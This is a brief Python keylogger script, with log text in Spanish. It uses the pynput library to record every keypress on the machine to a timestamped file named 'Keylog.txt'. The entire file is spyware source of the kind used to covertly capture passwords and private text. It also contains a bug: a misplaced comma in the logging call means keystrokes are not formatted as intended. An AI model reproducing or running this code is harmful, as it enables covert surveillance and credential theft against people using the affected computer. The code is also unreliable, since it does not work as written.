from pynput.keyboard import Listener
import logging 
 
logging.basicConfig(filename = "Keylog.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s") 
def keystore(key):
     logging.info("se ha presionado la tecla {0}",format(key))
     
with Listener(on_press=keystore) as input_keyboard:
    
    input_keyboard.join()
     